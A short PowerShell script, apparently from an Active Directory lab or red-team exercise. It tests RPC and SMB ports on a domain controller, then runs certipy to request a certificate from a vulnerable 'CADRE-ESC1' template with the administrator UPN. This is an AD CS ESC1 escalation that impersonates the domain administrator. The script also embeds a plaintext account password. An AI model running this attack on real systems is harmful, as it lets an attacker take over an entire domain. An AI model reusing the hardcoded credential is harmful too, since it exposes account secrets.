# Diagnose: dc01 RPC reachability + certipy web enrollment with debug
$ErrorActionPreference = "Continue"

Write-Output "=== port 135 reachability ==="
try {
  $t = Test-NetConnection 192.168.77.10 -Port 135 -WarningAction SilentlyContinue
  Write-Output "tcp135=$($t.TcpTestSucceeded)"
} catch { Write-Output "tcp135_err=$($_.Exception.Message)" }

Write-Output "=== port 445 reachability ==="
try {
  $t = Test-NetConnection 192.168.77.10 -Port 445 -WarningAction SilentlyContinue
  Write-Output "tcp445=$($t.TcpTestSucceeded)"
} catch { Write-Output "tcp445_err=$($_.Exception.Message)" }

Write-Output "=== certipy req -web -debug (target hostname, no dc-ip) ==="
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
& $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -web -http-scheme http -debug 2>&1 | Select-Object -Last 30
Write-Output "req_rc=$LASTEXITCODE"
Write-Output "=== DIAG_DONE ==="
